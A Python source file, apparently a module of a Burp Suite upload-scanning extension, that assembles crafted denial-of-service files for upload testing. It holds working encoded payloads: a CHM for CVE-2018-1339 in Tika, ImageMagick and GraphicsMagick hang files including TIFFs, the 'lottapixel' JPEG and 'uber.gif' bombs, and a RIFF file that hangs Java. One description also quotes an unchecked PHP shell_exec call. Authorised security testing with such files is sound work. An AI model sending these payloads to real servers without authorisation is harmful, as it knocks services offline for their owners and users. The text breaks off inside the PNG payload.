from misc.Constants import Constants
from misc.CustomRequestResponse import CustomRequestResponse

class Timeout_and_Dos():
    def check(self, injector, burp_extender):
        orig_filename = injector.get_uploaded_filename()
        orig_ct = injector.get_uploaded_content_type()
        attacks = []
        title = "File upload connection timeout"
        desc = "A connection timeout occured when uploading a specially crafted file, it is likely that a high " \
               "ressource consumption on the server-side took place (possible DoS). "


        desc_chm = desc + "The file was found by Hanno Boeck during a fuzzing run with chmlib. However, later when floyd " \
                          "started to fuzz the Java based Apache Tikka project in version 1.17, he found out that this file will " \
                          "also hang the Tikka parser and use 100% CPU at the same time. CVE-2018-1339 was assigned for Tikka. " \
                          "See http://www.openwall.com/lists/oss-security/2018/04/25/7 . "
        content = 'eJzzDAl2Y2ZgYEgAYkYgvsV77AonCwODwF/GmlXVFwTn8TAsOKn07I0gGh+kHgQkoHQFlA4RgNBnoPQ/Rgjdr8mAAjxDggNAUiF' \
                  'AzAUSAKpngrrhPxDA1IHYIDGQm7ImMcXqKV4QnPsT4oYQqDwMBPi6+zBgAxz6yp4uER4uQYyzGRaAeSFOQAeAjNVXDg4J8vT7xc' \
                  'Dwy4oFKBMcGRzi6svQyLbQEMgL8Q/wdA5m3M0gAOSEBvkA1TLulpGDcEKcfBh3C/Bw66u4eaaVZPomZuYxgkxU8Xfy8vQLDmFsd' \
                  'ZxqL6qvEh7uWFycn5yZWJJZluqTmZddrA+0WRarREBRfkFqUUklY6stiyBIhXdqZXl+UQpcmySGIEKLJQu3vkt+cmlual4JWLEI' \
                  'EtczLyW1Qi8jI5ux2bDRWwFJJiQxKSdVIT9NwTk/rwQkAlSVzMjQbCiKpKgktbjEUC+jJDeHsaXGVsTKyiWxJDG4IDE5Vd8vMRf' \
                  'o+uISBgYbDWTx4JL8osT0VH3fYOf83IKi1OLi1BR9qB0Mi8z7YnSIUl2UnwNSxZAlo0lQPVAqzzMvLZ8hiUOfoOKQosS84rT8ol' \
                  'x9sOtt1OJJ0FJt7uZsZGFpYqBr6WJsqGto6AJkORmZ6xoYOBo4Wxq6WjqbO9cCQ724JDEvORVkrh4wRjJpa4V+UGpxagk4Qhk2C' \
                  'htgzQyjYBSMglEwCkbBKBgFo2CIgDf/CasZBTQAjwbaAUMN/P8zINbOYfzLAACSHC2P'.decode("base64").decode("zlib")
        new_title = title
        attacks.append((orig_filename, content, '', new_title, desc_chm))
        if orig_filename or orig_ct:
            attacks.append(("CVE20181339.chm", content, "application/octet-stream", new_title, desc_chm))


        desc_im = desc + "The file was created by floyd during an offline fuzzing run with graphicksmagick. " \
                         "During lab tests for this plugin a timeout (aka 'hang') occured when uploading this file to a " \
                         "server with the following specification:<br>" \
                         "Manual compile of ImageMagick 6.5.4-10 2016-12-19 Q16 http://www.imagemagick.org Copyright (C)" \
                         " 1999-2009<br> PHP 5.3.10-1ubuntu3.13 with Suhosin-Patch (cli) (built: Jul  7 2014 18:52:09) <br>" \
                         "The PHP script basically used the following code with no further checks:<br>" \
                         "shell_exec('convert /tmp/tmpPhpInputFile -resize 50x50 /var/www/uploads/test.png');<br>" \
                         "It is therefore very likely that the server is running an outdated version of ImageMagick or GraphicksMagick. "
        content = 'R\xcc\xe3\x08\x08\x08\x08\x00@\x00\x00\x01\x08\x00 \x02\xf1\x03\x00\x00\x01$!\x00\x01\xffR\x00\xff\x1b\x07\x00' \
                  'R\xcc\xc4\x00\x01\x08\x08\x00\x06\x00\x15\x01\x08\x00\x00\x00\x00\xff\xff\xff\xd4\n\xa3\xf2\x00\t\x00.\x02i\x05' \
                  '\x06\x00$%S\x00\x04 \xff\xceV\xff  \x00\x00\x00\x00\x00 \x00\x00\x01\x00\xfd\xfe\xff\xff\x01\x00\x033\x00\x80v' \
                  '\x1d\x00\x00(\x00\x00\x00 \x00\x00\x00\x13\x02\x01\x00\x00\x00\x0e\x14\x92g \x00\x1e\x00\x00\x00\xfdG\x00\x00H\x00\x00'
        new_title = title
        attacks.append((orig_filename, content, '', new_title, desc_im))

        riff_java_hang = "RIFF\x1d\x1e\xb0\x00WAVEfmt\x00\x00\x10\x00\x00\x00\x80\x04\x084\x80\x04\x08\x01\x05\x00\x01\x00\x00\x00\xf2\x00" \
                         "@\x00\x1b\x01\x00(\x00\x1b\x00\x1a\xe2\x06\x00\x00\x004\x00\x00\x004\x00\xfa\xff\xf9\x00\x1c\x01\x03\x7f\xff\xff" \
                         "\xff\x81\x02\x00\x00\x00(\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x00\x80\x04\x084\x80\x04\x08\x01\x05\x00\x01" \
                         "\x00\x00\x00\xf2\x00@\x00\x1b\x01\x05\x00\x01\x00\x00\x00\xfa\xff\xf9\x00\x1c\x01\x03\x00\x01\x00\x00\x00\x02\x00" \
                         "d\x00(\x01\x03\x00\x01\x00\x00\x00\x10\x00\x00\x001\x01$\x00^^^\x00tttttttttt\x00\x00S\x01\x03\x00\x02\x00\x00" \
                         "\x00\x00\x00\x00\x00 \x00\xe8\x03a'\x01\x00\x002\x01 \x00\x14\x00\x00\x00D\x01\x00\x00;\xff\x00\r\n\x00\x00\x00" \
                         "[\x01,\x00tttttttttt\x02\x7fS\x00\xf6\x00\x02\x7f\xff\x00\x00\x00\x00\x00 \x00\xe8\x03ad1"
        desc_riff = desc + "The file was created by floyd during an offline fuzzing run with Apache Tika,  However, Tim Allison then " \
                         "realized it affects Java before version 10 and its RIFF parser. I only rediscovered this issue basically: <br>" \
                         "https://bugs.openjdk.java.net/browse/JDK-8135160<br>" \
                         "Unfortunately, there was never a CVE assigned to this. " \
                         "It is therefore very likely that the server is running Java before version 10. "
        new_title = title
        attacks.append((orig_filename, riff_java_hang, '', new_title, desc_riff))
        if orig_filename or orig_ct:
            attacks.append(("riffhang.wav", riff_java_hang, '', new_title, desc_riff))

        if injector.opts.file_formats['tiff'].isSelected():
            content = "TU0AKgAAC9QCBBU8C//////x///H4BAX/4BX+FqigD4f///+Bpf//8fkhd//13/4SKyk39f///gAA///z/4Bf//gx/gRASUP+///8CQb////" \
                      "/4D///N/+Cn6SKv3///kEiH//6//4///8Z/4f/giAPf9/wBAgD//X//1///hf/j//gAIi8AHAAgln/9///3///D/+H/+BAADwAASIgAf/z/" \
                      "/////8V/Y//8IQAMAQQSAlJP8Hf/////Butj//w/QAAEAIBQACeM3/////8Pv+P//GrwEBAAABQIExr///+//w2t4//4f/gyAiAQAlJAGG/" \
                      "////+C+vj//D3/CAgAAAIAQqeP/////4f3+P/8H/8MABBCgEkIDCf/////h/74//x//RCAAOBhEJAQP/////4Hffj//b/8NAAD6AgCAgPP/" \
                      "////AvXeP/g//wAAAPhACIAiHf////8Bv34P+Nf/HgCF8AoCCgAD/////gPX/hrwn/wQADwP/7/Xf78AAAAP/gKAKE9AB993/Q7f737q14A" \
                      "AAAf+aAAgDoA/+//oO//36W21gAAAB/8KACgGEf/99/Q/Wf7////AAAAP/wQAMgaAf/v/+H7/v39v26AAAA/+xAAAAQH/93/4P53d1vW94A" \
                      "AAH/4SACgDB//f/9j/97d2rv+oAAGP+BIAIEIP+/7/wN79///32fgAA+HwBaAiAQ/9//+gf9v+an1urgALUAEAACgKH/9//8H/vvv/1//zA" \
                      "MyRGABAORf/6///AXv21227a/aD8wQAAEAAD//P/+9D/159/93+r8vuAAAAACov/43//wGf8G/r6u+6/9WQAAAAIH//H+//A/1/P32/ut//" \
                      "/oQAAAAkP/8d//4A/38X79crdW/6AAAAACg//y//+UGf1d77fDgc//1IAAAAAAH8D//8AfX77312ABX//mAAAAAAAfwv//MA/71u69wAHH/" \
                      "9AAAAAAAA/A//8AGf2e9v7AAYd/4AAAgCAAB8r///ADf/d/W4ABkv+UAAAAAAAPgH+ymAPdp3/6gAFX/5AAAAOAABcKPwREAfvTdt/AAb6/" \
                      "5AAACkAAH4E+HUgAb8f++0AB6v/KAAAYAAA/ih4AUAB90V+egAK/v+AAAbaAAD8UHGAgADsB+v+AB+r/6AAA+AAAPwAMKEAAP8F/2uKss7/" \
                      "oABPhAAH/AAiIAAA/wH+uhWvwv8AAA0KAA/8VAIAAADcAt//6uWCflAAHAgIB/xEAAAAAHcB9+X9XcL/kAAYBAxr/AAUAAAA3AG/f5f/gv9" \
                      "AABAACUB8CAgAAAAuAf7/tV0A/6AAAKoLmn5QIYAAAPeA/+rv9wL/2AAB0AigfAI4QA//Bf8EAEYA/ACX//x/h5UDZ3////+Q/6BJUGn5AC" \
                      "t//JuB5APtt7///5T/AEIABfAAEn98P4HiAXZN////gRRAEGlj+AAB3f/FgAAClrv///+EKSCwIA/gAAAH//uAAANoHr///4CWz/wJT8IAA" \
                      "f//9YAAABAV////iAZN/AAfmAAD////AAAAIA+f//8BMKD8Ka9AAAf///+AAAAAOv///4BBQDwil9GAD////IAAAAA/3///AAqYfkAtAYAP" \
                      "////AgMAACv7//+CmUB/AFoJgA////8GQAAAPa///4AAGv8CAEAAD////oeMAAAfv///AAIQfwIIgAAP///8DbAAAD3wAhA+hMh/BCEAAA/" \
                      "///0FkAAAP2///wEAiV+AFADQD////A8wAAB/////ACQTf4Hngf4N///4hsAAAH7///8AAB+/wp/Dew////gEgAAAP+///gAAF+/BHeX/tv" \
                      "//8A0AAAB9////AAA3v8E/+f8H///4AAAAAH////8AAP/P4if//4N///GCAAAA+7///wAD3//kH///wf///gUAAAD////+ACBf3/ZH//+Bb" \
                      "//8CgAAAH3///4G+EPf9jX///A/3/AEAAAA/////hs+Aa/+n/Z/8FIs4AQAAAD////8C/sAP/yfJ//gOYKQAAAAAH9///gf/wD//OQHf/BK" \
                      "AgQAAAAA////+G//gFf/zAX/8AAAAIAAAAD///DYR/+g//94D//wAAAAAAAAAXv///D///D//2Af//AAAAQAAAAA////8J38eL///CL/8AA" \
                      "AAAAAAAB////w1b8O7//4n//wAAAAgAAAAP////C//4fv+PEr//AAAAIAAAAA////8P7/wn//0FX//lAAQAAAAAH3///z+21///eQf//gAA" \
                      "AAgAAAAf///8Pl1Hb8Ddf///AAAgCAAAAA////wf/b4R8Sv/BKAgAAFYAAAAH////B+X7f/wX//v/wAAADgAAAAP///4Of67X/yrv//+AAA" \
                      "IuAAAAC////w9Vr+3/1////8AAIT4AAAAH///+Fvd5f/+Kf///wAAAPgAAAA////gZrqv//67////AAAS+AAAAB////Aq6/Zv/l3///8AAA" \
                      "H4AAAAH///0Fd1e///JX///wAAC/gAAAAv///grVdfX//V////AAJA+AAAAD///8BbvP6//wp///8AAAPwAAAAb///wCrrlf//pf///wAAk" \
                      "/AAAAA7///Ar/md938Ke//+AAQj8AAAAD///7ARLnM//pXd/v4AAEc4////gAAAH+QIERIA9UwhAf//9Gj///+gAAB/u+pWSIpasAAR///Y" \
                      "OP///4AAAH/JJLXASXpFgAH//3h4//+vQAAAD/f7qhkip5ggk///6nj///+AAAB/765fkUVlQCAB///8+P//n6AAAD/599RIEmq2iQf///P" \
                      "4////AAAAP/v91YqF2tQIA///2vj//1+BAACP+pem4BqlJdFj////+P///0AAAb/1xdtapZqQAEP///p4////AAAEH/97paIH5SplB///3/" \
                      "j///9gAAAf/7PbbDeqqRIL////+P///wAAQH//TaTSQuVahEP////4///+AAAAX/+265kf/KOgA///6/j///5AAAA//0N09EebaCSP////+" \
                      "P///wAAAL//7dXKxvXZEAP////4////gAAAf/+2eH0bqyqGg/////j///5AAAA//972rEV2tqAL////+P///gQAAD//121Wl9qRQhf////4" \
                      "///+AAAAP/96en4G6yQEg/////j///xAAAD//969m2d4lmID////+P///kAAAP//tX9WntaSABf9///4///9IAAA///ubrdn3UioB/////i" \
                      "///5AAAD//+/7VleqiQQn////+IHf+AAAAP///H6+r/VoUEf////4iaf4hAAA///57lNWrhGGL/////gAXfgQAAH///91rq/zqpAP////+A" \
                      "A2+AAAAf///X6+N/uYGI/////4AIv5oAAB///+2VOv/6NAH/////gAF/IAAAP///9+ql//6BA/////+AAB+KAAA////VtVp/7WyL/////4A" \
                      "APxAAAD/////FKv/9Uyev////gAAuYgAAP///9fnV//+IB/p///+AAF8gAAA////3smV//qiv4P///4AAH5QAAD////3puv/5Ix/cD///gA" \
                      "A/lAAA////+f5b//6if+AK//+AAP9hgAD/////++f//6j/4ATX/4AB/8gAAf////P1////2/+AABf/gAD/7kAB/////v/v///4TeAAAf+AA" \
                      "AAAAAH///////////gH0AAAP4AAAAAAA///////////+APgAAAPgAAAAAADb//////////5P7AAAE+AAAAAAAAF//////////8/2AAAe4AA" \
                      "AAAAAAAD///////////lAABdgAAAAAAAAAD//////////7/6AD+AAAAAAAAAAC///////////////4oAAAAAAAAAA//////////93+fxDgA" \
                      "AAAAAAAAAH////////9//d8AOAAAAAAAAAAAP//5/////////YAwAAAAAAAAAAA//////6+f///xADQAAAAAAAAAAD//v///Y//b+34AIAA" \
                      "AAAAAAAAAIH//v/IB//n//AAgAAAAAAAAAAAAP9bv/gD/8+9wACAAAAAAAAAAAAAP7z/0AP/z/9UAAAOAQAAAwAAAAEMnQAAAQEAAwAAAAH" \
                      "2lwAAAQIAAwAAAAEAAQAAAQMAAwAAAAEAAwAAAQYAAwAAAAEAAAAAAQ0AAgAAAP8AAAyCAREABAAAAAEAAAAIARUAAwAAAAEAAQAAARYAAw" \
                      "AAAAEBmQAAARcABAAAAAEAAAvMARwAAwAAAAEAAQAAASkAAwALAAIAAAABATEAAgAAAEEAAAyYAUIAAwAAAAEAAQAAAAAAAG1pbmlzd2hpd" \
                      "GUtMWMtMWIudGlmZgA="
            content = content.decode("base64")
            file_details = "The image is TIFF image data, big-endian, starting with the MM file magic"
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im + file_details))
            if orig_filename or orig_ct:
                attacks.append(("bigEndianGraphicsMagick.tiff", content, "image/tiff", new_title, desc_im + file_details))

            content = 'SUkqABAAAAABAAEAAVYBwgsAAAEDAAEAAAABAAAAAQEDAAEAAADw/wAAAgEDAAMAAACaAAAAAwEDAAEAAAB0hwAABgEDAAEAAABMgAAAEQEE' \
                      'AAEAAAAIAAAAFQEDAAEAAAADAAAAFgEDAAEAAAABAAAAFwEEAAEAAAAIAAAAHAEDAAEAAAABAAAAUwEDAAMAAACgAAAAAAAAABAAEAAQAAI' \
                      'AAgACAA=='
            content = content.decode("base64")
            file_details = "The image is TIFF image data, little-endian, starting with the II file magic"
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im + file_details))
            if orig_filename or orig_ct:
                attacks.append(("littleEndianGaphicsMagick.tiff", content, "image/tiff", new_title, desc_im + file_details))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '/9j/4AAQSkZJRgABAQEAFgAWAAD/2wBDAAICAgICAQICAgIDAgIDAwYEAwMDAwcFBQQGCAcJCAgHCAgJCg0LCQoMCggICw8LDA0ODg8OC' \
                      'QsQERAOEQ0ODg7/2wBDAQIDAwMDAwcEBAcOCQgJDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg7' \
                      '/wAARCPr6+voDASIAAhEBAxEB/8QAHgAAAQUBAQEBAQAAAAAAAAAAAAECAwQFBgcJCgj/xABOEAACAQICBgUIBQgHBgcAAAAAAQIDEQQhB' \
                      'QYSMTJRByJBYZEICRMUcYGV0hUjM1KhNEJiY4KDksEXGSRDRXKTGCU2VHXCRFNzsdHh8P/EABoBAQEBAQEBAQAAAAAAAAAAAAACAQMEBQb' \
                      '/xAAgEQEBAQACAgMBAQEAAAAAAAAAARECMQMSEyFRBBRB/9oADAMBAAIRAxEAPwD7YAAH6B8sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
                      'AAAAAAAAA1uzAV8JG+Ec3dDWroCSHGTw3FeO+5YisgHAAAQWfIQsDPz/eBHZ8gs+ROAEFnyCz5E4Bkuq4Er4hAvEYtnyHj1whlmIbPkFny' \
                      'JwCNQWfILPkTgFILPkFnyJwAgs+QWfIk8c2NyaXB0PuANQWfILPkTgGy6gs+QWfInANQWfILPkTgBBZ8iJ32vay4AFSz5BZ8i2AFeKyROu' \
                      'EUAAAABE7oLda9wXCKAAAAAAARDHxCCviEDtOgPXCMHrhDKUAAOIAADoAAAAAAOYAAAAAAqAAAKAAAAAAAAAAAAAAAAAAA8c2NyaXB0Pi5' \
                      'BlyQAZAZckAAdIAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARZoAADPUAABUgAACgAAAAANl2EXkHAQttPexU21vZu' \
                      'iUBl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zC75jQ8Bl3zAaHgAE8c2NyaXB0PgAAAAAAAAAy9AG' \
                      'y7Bw2XYcb2InxDlwjXxDlwlhQAAAAAAAAAOwTaQPhGBUh+0guhgdgbkSANjvHBAAAAS6Aa+IAJLsLsbdCgLdhdiAAt2RucknmPI2mkAnpJ' \
                      'cx+1LmRtZK3IcBLFt7yRK7Io5byWLV7lQINbaY4a02ygqd0KIlZCgAABmQNcIvsF2VyC6C6GQFkI0kgcl2PMRu4yBHlcjcnbeSPcyJ8Joj' \
                      'c5KW8PSS5jWusIdJI6yTT9uTdmx12RJ2kJKdt7Lsn4rIWdVrtKNXFVIJ2ml7iHEYpU07tXOXxul4wUuskV6x2kjVxOlsVRUtislbuORx+t' \
                      'emKEJOljVGy+4jndK48c2NyaXB0PvK9Na5UoRmnUW7mc+Xripwn46LT/Shrjgtr1bS6p2/Uwf8AI8T090+9KWCU/VtZVTtu/ssH/I5bWbX' \
                      'KnLb+sXb2n8+6ya1U5up11f2ng537+nT04/j1PF+VD0108dOFPXFRgty9Sp//AAB/JOM09F6Qm1JWPHNjcmlwdD7RWOj2nwwxPnFun6k+p' \
                      'hNV7d+i5fOZNTzkflC027YPVb4VL5zp8vFxvg5PvOB8C5+ct8omN7YPVT4TL5yhV85t5RsE2sHqnf8A6RL5x8vBF/n5v0BiNXPz1VPOg+U' \
                      'lGTSweqVv+kS+cqz86P5S0VlgtUfg8vnM+bgz4PI/Q9s5DT87z86X5S6X5Dqh8Hl85FPzpflL/wDI6ofB5fOZ83Bs8HKv0UR3Eq4T85/9a' \
                      'd5TC3YLVH4PL5xP61PymUssDqf8Hl85U8/Bf+byWfT9GQH5x5edW8pxbsDqf8Gl85BLzrflPL/wOp3waXzlTz8EX+fyR+j8D83q8655UD3' \
                      'YDU74LL5xV51vyoL54DU74NL5zfm4sn8/kfpBEfCfnPoedS8pyqlfAan+7Q0vnNmh50HylattrA6o5vs0PL5y55JT/P5H6E27ITayPgVh/' \
                      'OW+UZVaUsFqp7tEy+c3sP5xryg6qW3gtV/douXzle0TfDzfdS6uKmrnxEoecH6eqkbywmrXu0ZL5jQh5f8A07NX9U1b+GS+Y2WN+Hm+1Y1' \
                      'cbPix/t/9Ov8AyurfwyXzEcvOBdOyllhNW/hkvmNljPi56+1Ns/YHtPidPzg3TwnlhNWvhkvnKs/OE9PSvbCatfDJfOdJzkdJ4uT7a1JpI' \
                      'zMRiYxTu0rd58Up+cF6eJuzwuraT5aMl85A/Lv6b8RBupQ1fV+WjpL/ALh7xU8fKvsLpbSkKcX10rd55NpzWFU1U+s/E+YeJ8szpfxsPrq' \
                      'WhFf7uBa/7jktIeVF0m4zbVWOi1f7uFa/mPd3ni5R/emtGuCpuo1V7OZ/OmsmvkozklWfb2n8uaT6ctd8epen9Sz+7Qa/mcBj+kDWDGyfp' \
                      'nQz+7Ta/mcby2Ok4V7np3Xqc/SfXPxPItLa4Tq1Kn1rzfM4CvprHYlv0slnyVjKqQddvblLPfZnm5S62ytuvrHJ4mT9I/EDnHoyhJ3c6l/' \
                      '8wEZWZUWLxiuzDrYlO+ZmYjGtreZk8VK7zPE7tOrXTuZ1ae0mVXiG5bxim32smitVj1+0qVIckabhd7yKVPIllmsidN23MrTVma1SGTM2r' \
                      'G17FSJnajLLnkQuW8lle7z3FSd7tbi5NddK7t8xPQ7fYSUqbk1vzNjDYRySyLkZbrKp4KUlknn3GlQ0PObVoPwOu0forb2ere53mjdARnF' \
                      'dUqMeb4PQFW8eq8+46zCavVLLqvwPVtH6tRajen+B2mF1Xp7KtTPVxHj2F0FUi45Zew6TC6InFcL8D1aGrtNW+r3dxbjoSEN0To5Wfbz7D' \
                      'aOmoZpmnHBNQO0jo2KVtkV4CK/NLnRbji/U3y/ArVMK7s7mWCjl1SrVwSTfVNc7NcHVwru8ijVwzT3PwO6qYNWeRm1cHnZLcGuNeHan7O4' \
                      'tUqPU3G1PCWnmhY4a3YFce1GNLIinQ35Zs3I4a8VkP9UTdrPwDrenKVMLLZ5mdUwsnfI7yWCSjuKM8CnfI5tcO8K08/8A2G+gafb4HWywc' \
                      'U9xRnhkpbiLWWawvRPvA1XRW12Ac9pkeb19V6EY39cqtv8ARRmVNX6NNv8AtNSXtijusTwruMPEPrNHG8Y521yNTRdOm3ao37ipOjGlubd' \
                      'jfr72Y1eO852SukusyriHCGUPxKM8fJL7NeJarwbTMudJ3ZFkaSpj5W+zWfeU54pylnFZ946dO6IZUmGZEU6+b6i8SL1hLL0SfvJHSuyGV' \
                      'J7bI2tT08eqcl9RCXtZp0NPOk8sHTf7TMF0usKoZm+1HdYfXWth7bOjaMrc5yN/DdK2MwtlHQmGlbnVkeVdgx8Rs5coPHNjcmlwdD5oDCO' \
                      '362RtUvKA0vDdq7g/9aZ/OkOItR3oqeTnP+j+i15QemW/+HcH/rTH/wBPmmHn9AYTP9dM/nZSzLMZ5FfLz/WySv6A/p40u/8AAcJn+umC6' \
                      'ctLNZ6Dwv8ArTPBFOyRLGoL5ef6qcONr3qPTVpWSu9CYZfvZEkemLSdR56Gw2f62R4ZSqLZRcpVFkbPLz/UXjHtsOlPH1t+iaEb8qkizHp' \
                      'DxU9+jaGf6cjxuhVsa1LEKyXaX8vL9T6x6ktdsRUV3o+kv22JLXfEQWWj6Tt+mzzyGIWyFSunBj5eX6esdzPpCxVNXWjKD/bkUavSljqf+' \
                      'D4d/vJHAV6yZj4ionexl8vL9U9Hq9L+kI3S0Lhn+9kZ1Tph0i0/9yYa3/qyPL6r675GdU3M5fJz/R6jPpe0i8/obDZ/rZFWp0saQf8AhGH' \
                      'X7yR5ZLcRS7DPfl+j099KOPbv9FUP9SQHlwG+3L9H9G4h3bMPEO83yOYqa/UajutGzX71GbV1zpTu/UJr94jpeccrL26Kt2mdVjdbkYc9b' \
                      'KUk/wCxT/jRWlrPSb/I5/xoj2i5WrVpXlmsijOknIqy1ipOX5LP+NEf03SefqzX7RNsbsTyo/gQyoXftI3pim3+Tu3+Yj+laf8A5Dv7SbY' \
                      'bDpYfPuK06LU2iR6Tg/7p+JG8dCT+yfiSbFaVNp7iGUeZadeMnwtDHaS3WBsVGuwLLkWPQ3z2vwD0H6QNiurX7iRPkSeg/SFVFr878AbDF' \
                      'Ky7SaNTMZ6J80Js7L33CpYkdS0hyrZEDV3vE2WFTlGlSq9W5bhWzMVT2Va1xyxSg+Fv3myptjpaWJsXoYvcchHSEYv7N+JKtKJf3b8Stid' \
                      'js44zNZ2CeMy3nF/TKUvsX/EL9NJq3oX/ABDYbHU1MTdMpVaza7jD+lVJfZPxD6QUl9m17xbFSWrs5K5Vm7iKtt9lh2xtPfYgyq0v5kUuw' \
                      'v8AqrkuNL3DZYN2+0/AGVQAtPCyvxLwAMUrMY45MtKIOF12Bl6UXHJkTVi9OORWkrK1gg0fdEUtw3az3gWAIFN/esP2u8CQVOzI9rvG7Xe' \
                      'BOm7kqmU9r2kimrgXYyyJOwqRll2kqlkBMBGpNoW7AeR9gt2IBGBJZcgsuQELXaQyV0/aWWt+WRE12AQWYnaTNchj3MCq+IQdPK7IHJ3DP' \
                      '+rEZWyLEJ2sZ7qZCKtms2HWVu06iLUaqsYEa65k0a+Ts7hdrooVUkPdVPtRhwxGW/InjX2nvCbdaG33AVdp8wDEaTTEdSK33JdnIr1IO+Q' \
                      'DJ1IvdcilFy3bxdh3JVFoIsxWeFqS3NDlo+vJZSgveXUu0sxeQYyvo+unnKD9414WrHe45d5st3RXmnc2TRmPD1Lb0I6FR5XRfcchts0Vk' \
                      'XkUvVKje+I9YWqnxIvJdZjhjLFL0U4rNoVNonlmmRNZjIkqnZD9ruIrMclYZBKlJ8h2ywj2j1xGWBNh8xuyyYZZnPRE+1Ddh78iRp3YqVj' \
                      'pIIJRa9xXm0r3LkkynUi8zcjZNVZzj3lac4bXaTTg1crSg1NGWMv0lVN1HaNlfmTx0XXmrqUPexKEbNXNujUSiSjay1onE7N9uHiPWisV9' \
                      '+n4m6qisPvdZBUtYa0biY/nw8SxT0diU+OHiapLF7graorR2J2eKHiBtRa2EANrK9GuZHKlkaCwtftgvESVGcU7xSC2X6Jb+0HTy3WLkko' \
                      '70RtxccmE1U3McpNEjjdjXRm1kl4hmUifWHbN4iww9Xa3K3tLUMNVcOFeJUJNU3Gy3Ij2e41Hg61uBeJE8JV7Ype8pbPluG3fMs1KFSO9f' \
                      'iVX1XmZsZegFu4VOJIkmrmoQ2VxR8pRj2kEq1PLrfgZsEhKuIpvEUl+c/AesVRbyk/AXoXo2t2C2RXhiKctzfgTqpB9v4HKShHHPcJZciT' \
                      'bhb/6GOcf/wAjrOhG14Ecqd1e2RK6tPm/AX0tK1tp+BrZ2pSo3vlkVZUknmjY26byvl7CN4aVRvZV7k2xnJjrqv2FiFVIu/ReKqcFNO/6S' \
                      'FWgNKN9Wiv40SjKZTrXazL0J9UihoLSlPOdGKX+dE6wWKprrQS/aNytkulv3/iPg7MYqNRLNLLvFUZ9oyryrW13sCvtd4DKZXQlStFu9iz' \
                      'F3ElG6ujFsOpFuViBxd9xrTpdxXlTt2AUUuZKuEe4cw2e8CSnvRep8BRhkky7TeQFj8z3FefETX6thjimmBm11dPmZNWL29xuVY3zM2rDr' \
                      'bgKcI9bMmXAxFCz5DmkosIv2q1OFlGStLuNCeaZUlHL2kXtilPiCHGSVIq5CuI7Rc6XqTyLsJKxnwfVLcJZGpvayI+EbdhdhiGW4a+Ie12' \
                      'MNnO9jKHw4jSo8SM+OTL9J5qxxo2MO80bdDs9hg4eWa5nQYWzgm95YfVT9GY1aLuzoakU6e4yqtO7eR0dGE4tNkLXVNCcLSeRSnHIqCq97' \
                      'AdZAUNOGMw/bWiix65hGrKvE5EfT+0RzvGMvTqXWoNZVE7kM50WuNGZT3IkluJxmpZ1KX30mRupBrKaZSqcTGQ7BjZdaUWmt6LEJLtdilH' \
                      '+ROMauKpBR4kM9LDtmiq+Eil2DE6tTqU3fropz2XLJoY+IQqcYabKKW7cQSV3kTt9hC95vrEoXCTvZNkboVHHKDLkH1l3lqO5E3hOxgzwu' \
                      'Ib+ydiv6nir5UJHUy3BHcJMVrno4LGNZYebLcMBjVH8nnl3HSUeJGjH7Mbhm/bkPVMUl1qMkDw1dP7JnUVFdoqzWbHtTHPvD1rfZsPQVtn' \
                      '7NmzK+zkNa7GO4YylRqW4GTwjKNtpW5loZPcTYYno1qcLbU0jew+kMHCmlPEwi13nIT4iF32zDHoT0po1xt63T9lynU0ho9v8qp+Jw0lmM' \
                      'luK1Tq6uLwTbccRB+xmdPEUHuqowgEtGo61K/GgMsDfaiV7x0PtEAHS9MvTQp7kPlwABCFSp2jI9gAFxehvsTreABpH2kUwAOaF8Q17gAu' \
                      'Bst3uK7k0gA0LTbui7F9ZIAMvQkfCEQAgXqW9F6MnsABF7XOjZpNFeazYAY1BLcRS3gBc6DbIilvABehXlvsRS3gBAhnvGSS3AACbKGAAD' \
                      'dpgAAf/2Qo='
            content = content.decode("base64")
            desc_im2 = desc + "The file was taken from a public hackerone report on https://hackerone.com/reports/390 " \
                              "(lottapixel.jpg). The file seems to exploit missing bounds checks in ImageMagick's " \
                              "identify command used by the Paperclip gem in Ruby. The image header says it is 64250 in " \
                              "width and 64250 in height. This means if one byte is allocated per pixel, 4128062500 " \
                              "bytes will be allocated, which results in memory exhaustion. It is therefore very likely " \
                              "that the server is running an outdated version of ImageMagick or GraphicksMagick or is " \
                              "simply not restricting ressource allocation properly."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im2))
            if orig_filename or orig_ct:
                attacks.append(("lottapixel.jpg", content, "image/jpeg", new_title, desc_im2))

        if injector.opts.file_formats['gif'].isSelected():
            content = 'R0lGODlhAQABAPAAAH9/hwAAACH5BAAAAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAAQABAAACAkQBACH5BAAAAAAALAAAAAABAAEAAAICRAEAIfkEAAAAAAAsAAAAAAEAAQAAAgJEAQAh+'
            content += 13332 * "QQAAAAAACwAAAAAAQABAAACAkQBACH5BAAAAAAALAAAAAABAAEAAAICRAEAIfkEAAAAAAAsAAAAAAEAAQAAAgJEAQAh+"
            content += 'QQAAAAAACwAAAAAAQABAAACAkQBADs='
            content = content.decode("base64")
            desc_im2 = desc + "The file was taken from a public hackerone report on https://hackerone.com/reports/400 " \
                              "(uber.gif). The file seems to exploit missing bounds checks in ImageMagick's identify " \
                              "command used by the Paperclip gem in Ruby. The image is composed of 40k 1x1 images. " \
                              "This usually results in memory exhaustion or another server side timeout. It is " \
                              "therefore very likely that the server is running an outdated version of ImageMagick or " \
                              "GraphicksMagick or is simply not restricting ressource allocation properly."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_im2))
            if orig_filename or orig_ct:
                attacks.append(("uber.gif", content, "image/gif", new_title, desc_im2))

        if injector.opts.file_formats['png'].isSelected():
            content = 'iVBORw0KGgoAAAANSUhEUgAAnCAAAAAgBAMAAABSWQRUAAAAElBMVEX///////////8AAAD/AAD//wB+tBpvAAAAAXRSTlMAQObYZgAAAAF' \
